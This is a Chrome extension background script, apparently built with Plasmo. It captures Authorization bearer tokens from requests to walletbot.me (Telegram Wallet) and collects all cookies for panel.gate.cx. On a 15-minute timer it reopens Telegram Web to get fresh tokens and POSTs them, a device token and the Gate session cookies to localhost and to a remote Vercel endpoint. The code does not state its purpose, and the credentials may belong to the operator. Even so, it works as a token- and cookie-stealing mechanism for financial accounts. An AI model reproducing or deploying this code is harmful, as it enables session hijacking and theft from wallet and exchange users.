import type { PlasmoMessaging } from "@plasmohq/messaging"
import { Storage } from "@plasmohq/storage"

const storage = new Storage()
const FIFTEEN_MINUTES = 15 * 60 * 1000

interface RequestData {
  topLevelUrl: string
  authorization: string
}

let recordedRequests: RequestData[] = []
let intervalId: number | null = null

// Function to get cookies from panel.gate.cx
async function getPanelCookies() {
  const cookies = await chrome.cookies.getAll({ domain: "panel.gate.cx" })
  return cookies
}

// Function to send data to routes
async function sendDataToRoutes(
  token: string,
  deviceToken: string,
  cookies: chrome.cookies.Cookie[]
) {
  const routes = [
    "http://localhost/api/token-update", // Updated to use port 80
    "https://p2pp.vercel.app/api/token-update"
  ]

  const results = await Promise.all(
    routes.map(async (route) => {
      try {
        // First, send OPTIONS request
        await fetch(route, {
          method: "OPTIONS",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json"
          }
        })

        // Then send actual POST request
        const response = await fetch(route, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json"
          },
          body: JSON.stringify({
            tgToken: token,
            deviceToken,
            gateCookie: cookies.map((c) => `${c.name}=${c.value}`).join("; ")
          })
        })

        if (!response.ok) {
          const errorText = await response.text()
          throw new Error(
            `HTTP error! status: ${response.status}, body: ${errorText}`
          )
        }

        const data = await response.json()
        if (!data.success) {
          throw new Error(data.message || "Unknown error occurred")
        }

        console.log(`Successful update for ${route}:`, data)
        return { route, success: true, data }
      } catch (error) {
        console.error(`Error sending data to ${route}:`, error)
        return {
          route,
          success: false,
          error: error.message,
          timestamp: new Date().toISOString()
        }
      }
    })
  )

  // Log results for debugging
  results.forEach((result) => {
    if (!result.success) {
      console.warn(`Failed update for ${result.route}:`, result.error)
    } else {
      console.log(`Successful update for ${result.route}`)
    }
  })

  return results
}

async function openWalletTab() {
  return new Promise<chrome.tabs.Tab>((resolve) => {
    chrome.tabs.create({ url: "https://web.telegram.org/k/" }, (tab) => {
      chrome.tabs.onUpdated.addListener(function listener(tabId, info) {
        if (tabId === tab.id && info.status === "complete") {
          chrome.tabs.onUpdated.removeListener(listener)
          resolve(tab)
        }
      })
    })
  })
}

async function getNewToken() {
  const tab = await openWalletTab()
  await new Promise((resolve) => setTimeout(resolve, 5000)) // Wait for 5 seconds
  chrome.tabs.sendMessage(tab.id, { action: "openWallet" })

  return new Promise<string>((resolve, reject) => {
    const timeout = setTimeout(() => {
      reject(new Error("Timeout waiting for token"))
    }, 120000) // 2 minutes timeout

    const checkToken = setInterval(async () => {
      const token = await storage.get("telegramToken")
      if (token) {
        clearInterval(checkToken)
        clearTimeout(timeout)
        chrome.tabs.remove(tab.id) // Close the tab after getting the token
        resolve(token)
      }
    }, 1000)
  })
}

async function periodicUpdate() {
  try {
    console.log("Starting periodic update...")
    const token = await getNewToken()
    console.log("New token obtained:", token ? "Yes" : "No")

    const deviceToken = await storage.get("deviceToken")
    console.log("Device token available:", deviceToken ? "Yes" : "No")

    const cookies = await getPanelCookies()
    console.log("Gate cookies found:", cookies.length)

    if (!token || !deviceToken) {
      throw new Error("Missing required tokens")
    }

    if (cookies.length === 0) {
      console.warn("No Gate cookies found")
    }

    const results = await sendDataToRoutes(token, deviceToken, cookies)

    // Check if at least one route succeeded
    const anySuccess = results.some((r) => r.success)
    if (!anySuccess) {
      throw new Error("All routes failed")
    }

    console.log("Periodic update completed")
    return results
  } catch (error) {
    console.error("Error in periodic update:", error)
    throw error // Re-throw to be handled by caller
  }
}

// Start periodic updates
function startPeriodicUpdates() {
  if (intervalId) {
    console.log("Periodic updates already running")
    return
  }

  console.log("Starting periodic updates (every 15 minutes)")

  // Initial update
  periodicUpdate().catch((error) => {
    console.error("Initial periodic update failed:", error)
  })

  // Set up interval for 15-minute updates
  intervalId = window.setInterval(() => {
    periodicUpdate().catch((error) => {
      console.error("Periodic update failed:", error)
      // Consider stopping updates if there are too many consecutive failures
    })
  }, FIFTEEN_MINUTES)
}

// Stop periodic updates
function stopPeriodicUpdates() {
  if (intervalId) {
    window.clearInterval(intervalId)
    intervalId = null
  }
}

// Handle messages from content scripts
export async function handleMessage(req: PlasmoMessaging.Request) {
  if (req.name === "walletOpened") {
    console.log("Wallet opened status:", req.body)
    if (req.body.success) {
      console.log("Wallet opened successfully, waiting for token...")
    } else {
      console.error("Failed to open wallet:", req.body.error)
    }
  }
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const authHeader = details.requestHeaders.find(
      (header) => header.name.toLowerCase() === "authorization"
    )
    if (authHeader && authHeader.value) {
      let token = authHeader.value
      if (token.startsWith("Bearer ")) {
        token = token.split(" ")[1]
      }
      console.log("Intercepted token:", token)
      storage.set("telegramToken", token)
      recordedRequests.push({
        topLevelUrl: details.url,
        authorization: token
      })
    }
  },
  { urls: ["*://walletbot.me/*"] },
  ["requestHeaders"]
)

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "initiateWalletProcess") {
    getNewToken()
      .then((token) => {
        sendResponse({ success: true, token })
      })
      .catch((error) => {
        sendResponse({ success: false, error: error.message })
      })
    return true
  } else if (message.action === "getTokenFromLocalStorage") {
    storage.get("telegramToken").then((token) => {
      storage.get("deviceToken").then((deviceToken) => {
        sendResponse({
          accessToken: token,
          deviceToken,
          tokenPreview: token ? `${token.substring(0, 15)}...` : ""
        })
      })
    })
    return true
  } else if (message.action === "getRecordedRequests") {
    sendResponse(recordedRequests)
    return true
  } else if (message.action === "startPeriodicUpdates") {
    startPeriodicUpdates()
    sendResponse({ success: true })
    return true
  } else if (message.action === "stopPeriodicUpdates") {
    stopPeriodicUpdates()
    sendResponse({ success: true })
    return true
  } else if (message.action === "sendImmediateUpdate") {
    periodicUpdate()
      .then(() => {
        sendResponse({ success: true })
      })
      .catch((error) => {
        sendResponse({ success: false, error: error.message })
      })
    return true
  }
})

export {}
